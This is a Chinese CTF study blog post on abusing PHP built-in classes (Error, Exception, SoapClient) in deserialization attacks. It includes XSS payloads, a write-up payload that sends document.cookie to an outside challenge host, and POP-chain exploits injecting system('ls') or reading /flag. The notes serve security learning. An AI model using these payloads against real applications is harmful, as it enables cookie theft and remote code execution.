<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php原生类 | 红烧花园宝宝</title><meta name="author" content="红烧花园宝宝"><meta name="copyright" content="红烧花园宝宝"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学习一下php原生类 常用的php原生类 Error Exception SoapClient Directorylterator SimpleXMLElement ZipArchive SplFileObject  一个一个来跟着大佬博客学习 使用Error/Exception内置类进行xss内置类Error 使用于php7 开启报错  Error类是 php 的一个内置类，用于自动自">
<meta property="og:type" content="article">
<meta property="og:title" content="php原生类">
<meta property="og:url" content="https://lxu2n.github.io/posts/ab758827/index.html">
<meta property="og:site_name" content="红烧花园宝宝">
<meta property="og:description" content="学习一下php原生类 常用的php原生类 Error Exception SoapClient Directorylterator SimpleXMLElement ZipArchive SplFileObject  一个一个来跟着大佬博客学习 使用Error/Exception内置类进行xss内置类Error 使用于php7 开启报错  Error类是 php 的一个内置类，用于自动自">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lxu2n.github.io/image/1.png">
<meta property="article:published_time" content="2025-12-17T06:14:50.000Z">
<meta property="article:modified_time" content="2025-12-17T06:15:48.404Z">
<meta property="article:author" content="红烧花园宝宝">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lxu2n.github.io/image/1.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "php原生类",
  "url": "https://lxu2n.github.io/posts/ab758827/",
  "image": "https://lxu2n.github.io/image/1.png",
  "datePublished": "2025-12-17T06:14:50.000Z",
  "dateModified": "2025-12-17T06:15:48.404Z",
  "author": [
    {
      "@type": "Person",
      "name": "红烧花园宝宝",
      "url": "https://lxu2n.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/image/6.png"><link rel="canonical" href="https://lxu2n.github.io/posts/ab758827/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'php原生类',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script></head><body><canvas id="bubble_canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:none"></canvas><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><meta name="generator" content="Hexo 7.3.0"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(https://lxu2n.github.io/image/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/6.png" alt="Logo"><span class="site-name">红烧花园宝宝</span></a><a class="nav-page-title" href="/"><span class="site-name">php原生类</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">php原生类</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-17T06:14:50.000Z" title="发表于 2025-12-17 14:14:50">2025-12-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-17T06:15:48.404Z" title="更新于 2025-12-17 14:15:48">2025-12-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>学习一下php原生类</p>
<h1 id="常用的php原生类"><a href="#常用的php原生类" class="headerlink" title="常用的php原生类"></a>常用的php原生类</h1><ol>
<li>Error</li>
<li>Exception</li>
<li>SoapClient</li>
<li>Directorylterator</li>
<li>SimpleXMLElement</li>
<li>ZipArchive</li>
<li>SplFileObject</li>
</ol>
<p>一个一个来跟着大佬博客学习</p>
<h1 id="使用Error-Exception内置类进行xss"><a href="#使用Error-Exception内置类进行xss" class="headerlink" title="使用Error/Exception内置类进行xss"></a>使用Error/Exception内置类进行xss</h1><h2 id="内置类Error"><a href="#内置类Error" class="headerlink" title="内置类Error"></a>内置类Error</h2><ul>
<li>使用于php7</li>
<li>开启报错</li>
</ul>
<p>Error类是 php 的一个内置类，用于自动自定义一个 Error，在 php7 的环境下可能会造成一个 xss 漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个 POP 链走到一半就走不通了，不如尝试利用这个来做一个 xss，其实还是有好一些 cms 会选择直接使用 echo  的写法，当 PHP 对象被当作一个字符串输出或使用时候（如echo object的时候）会触发 __toString 方法，这是一种挖洞的新思路。</p>
<p>对内置类Error xss的使用</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = unserialize($_POST['cmd']); //反序列化成对象</span><br><span class="line">echo $a; echo的时候触发__tostring</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = new error('&lt;script&gt;alert(123)&lt;/script&gt;');</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1765868832813-bac0997a-472a-4a90-bd65-2f07b1658f77.png" alt="img"></p>
<h2 id="内置类Exception"><a href="#内置类Exception" class="headerlink" title="内置类Exception"></a>内置类Exception</h2><ul>
<li>适用于php5，7</li>
<li>开启报错</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = unserialize($_POST['cmd']);</span><br><span class="line">echo $a;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = new Exception('&lt;script&gt;alert(123)&lt;/script&gt;');</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1765869113845-c5671d51-2ca7-4bfe-a617-99235d61ee83.png" alt="img"></p>
<p>成功触发</p>
<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>好像提到没环境了，那我们就把wp过一遍吧</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc = new Exception("&lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;");</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>其实就是使用xss执行window.open然后劫取cookie获得flag</p>
<h1 id="使用Error-Exception内置类绕过hash"><a href="#使用Error-Exception内置类绕过hash" class="headerlink" title="使用Error/Exception内置类绕过hash"></a>使用Error/Exception内置类绕过hash</h1><p>在上文中，我们已经认识了 Error 和 Exception 这两个 PHP 内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过 <code>md5()</code> 函数和 <code>sha1()</code> 函数的比较。这里我们就要详细的说一下这个两个错误类了。</p>
<h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p><strong>Error</strong> 是所有 PHP 内部错误类的基类，该类是在 PHP 7.0.0 中开始引入的。</p>
<p>类摘要</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Error implements Throwable {</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><strong>类属性：</strong></p>
<ul>
<li>message：错误消息内容</li>
<li>code：错误代码</li>
<li>file：抛出错误的文件名</li>
<li>line：抛出错误在该文件中的行数</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.construct.php">Error::__construct</a> — 初始化 error 对象</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php">Error::getMessage</a> — 获取错误信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getprevious.php">Error::getPrevious</a> — 返回先前的 Throwable</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getcode.php">Error::getCode</a> — 获取错误代码</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getfile.php">Error::getFile</a> — 获取错误发生时的文件</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getline.php">Error::getLine</a> — 获取错误发生时的行号</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettrace.php">Error::getTrace</a> — 获取调用栈（stack trace）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettraceasstring.php">Error::getTraceAsString</a> — 获取字符串形式的调用栈（stack trace）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.tostring.php">Error::__toString</a> — error 的字符串表达</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.clone.php">Error::__clone</a> — 克隆 error</li>
</ul>
<h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p><strong>Exception</strong> 是所有异常的基类，该类是在 PHP 5.0.0 中开始引入的。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Exception {</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><strong>类属性：</strong></p>
<ul>
<li>message：异常消息内容</li>
<li>code：异常代码</li>
<li>file：抛出异常的文件名</li>
<li>line：抛出异常在该文件中的行号</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php">Exception::__construct</a> — 异常构造函数</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php">Exception::getMessage</a> — 获取异常消息内容</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php">Exception::getPrevious</a> — 返回异常链中的前一个异常</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php">Exception::getCode</a> — 获取异常代码</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php">Exception::getFile</a> — 创建异常时的程序文件名称</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php">Exception::getLine</a> — 获取创建的异常所在文件中的行号</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php">Exception::getTrace</a> — 获取异常追踪信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php">Exception::getTraceAsString</a> — 获取字符串类型的异常追踪信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php">Exception::__toString</a> — 将异常对象转换为字符串</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php">Exception::__clone</a> — 异常克隆</li>
</ul>
<p>我们可以看到，在 Error 和 Exception 这两个 PHP 原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>我们以 Error 为例，我们看看当触发他的 <code>__toString</code> 方法时会发生什么：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error("payload",1);</span><br><span class="line">echo $a;</span><br></pre></td></tr></tbody></table></figure>

<p>输出：</p>
<p><img src="/posts/ab758827/1765872113859-8d2458ef-45a5-4d97-b7fe-d646cd69269f.png" alt="img"></p>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error("payload",1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>在来看看下一个例子：</p>
<p><img src="/posts/ab758827/1765872266165-065540a8-5c3a-494d-89b3-514aae8f904b.png" alt="img">可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p>
<p>Error 和 Exception 类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。</p>
<h2 id="0xgame2025-Rubbish-Unser"><a href="#0xgame2025-Rubbish-Unser" class="headerlink" title="[0xgame2025]Rubbish_Unser"></a>[0xgame2025]Rubbish_Unser</h2><p>exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ZZZ</span><br><span class="line">{</span><br><span class="line">    public $yuzuha;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class HSR</span><br><span class="line">{</span><br><span class="line">    public $robin;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class HI3rd</span><br><span class="line">{</span><br><span class="line">    public $RaidenMei='1';</span><br><span class="line">    public $kiana=1;</span><br><span class="line">    public $guanxing;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class GI</span><br><span class="line">{</span><br><span class="line">    public $furina;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">class Mi</span><br><span class="line">{</span><br><span class="line">    public $game;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = new ZZZ();</span><br><span class="line">$a-&gt;yuzuha = new Mi();</span><br><span class="line">$a-&gt;yuzuha-&gt;game = new GI();</span><br><span class="line">$a-&gt;yuzuha-&gt;game-&gt;furina  = new HI3rd();</span><br><span class="line">//$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;kiana='1';</span><br><span class="line">//$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;RaidenMei= 1;</span><br><span class="line">$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;guanxing= new HSR();</span><br><span class="line">$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;guanxing-&gt;robin = "system('ls');";</span><br><span class="line"></span><br><span class="line">$b=array($a,0);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/ab758827/1761741361926-2b337420-34bb-4e78-bf26-8d7f7cdd2ccd.png" alt="img"></p>
<p>md5绕过是php8的(和原生类 Error 有关 )</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a='1';</span><br><span class="line">b=1</span><br><span class="line">或者</span><br><span class="line">a=0;</span><br><span class="line">b=0E1;</span><br></pre></td></tr></tbody></table></figure>

<p>这个题，我当时做的时候用的就是error类或者exception类，但是直接生成的exp需要去掉一些东西（ai去掉的，现在已经忘记了），然后url编码后，直接就可以打了</p>
<h2 id="江苏省第七届网络空间知识技能大赛决赛-web1"><a href="#江苏省第七届网络空间知识技能大赛决赛-web1" class="headerlink" title="[江苏省第七届网络空间知识技能大赛决赛]web1"></a>[江苏省第七届网络空间知识技能大赛决赛]web1</h2><p>第一个绕过使用均可以</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new Error("",1);$b = new Error("",2);</span><br><span class="line"></span><br><span class="line">$a = NAN;</span><br><span class="line">$b = "NAN";</span><br></pre></td></tr></tbody></table></figure>

<p>然后是date这里会卡住</p>
<p><img src="/posts/ab758827/1763444552064-c9a5b0e1-b0dd-4128-af9a-2245d3f6b426.png" alt="img"></p>
<p><img src="/posts/ab758827/1763444568568-1d32800b-0a01-4556-a0ec-766041864a9e.png" alt="img"></p>
<p>转义即可哦</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class date{</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $file;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = new date();</span><br><span class="line">$a-&gt;a=NAN;</span><br><span class="line">$a-&gt;b='NAN';</span><br><span class="line">$a-&gt;file='/\f\l\a\g';</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></tbody></table></figure>

<p>这里就是两种方法都可以绕过</p>
<h1 id="使用soapClient类进行SSRF"><a href="#使用soapClient类进行SSRF" class="headerlink" title="使用soapClient类进行SSRF"></a>使用soapClient类进行SSRF</h1><h2 id="soapClient类"><a href="#soapClient类" class="headerlink" title="soapClient类"></a>soapClient类</h2><p>PHP 的内置类 SoapClient 是一个专门用来访问 Web 服务的类，可以提供一个基于 SOAP 协议访问 Web 服务的 PHP 客户端。</p>
<p>类摘要如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SoapClient {</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string|null $wsdl , array $options = [] )</span><br><span class="line">    public __call ( string $name , array $args ) : mixed</span><br><span class="line">    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null</span><br><span class="line">    public __getCookies ( ) : array</span><br><span class="line">    public __getFunctions ( ) : array|null</span><br><span class="line">    public __getLastRequest ( ) : string|null</span><br><span class="line">    public __getLastRequestHeaders ( ) : string|null</span><br><span class="line">    public __getLastResponse ( ) : string|null</span><br><span class="line">    public __getLastResponseHeaders ( ) : string|null</span><br><span class="line">    public __getTypes ( ) : array|null</span><br><span class="line">    public __setCookie ( string $name , string|null $value = null ) : void</span><br><span class="line">    public __setLocation ( string $location = "" ) : string|null</span><br><span class="line">    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool</span><br><span class="line">    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

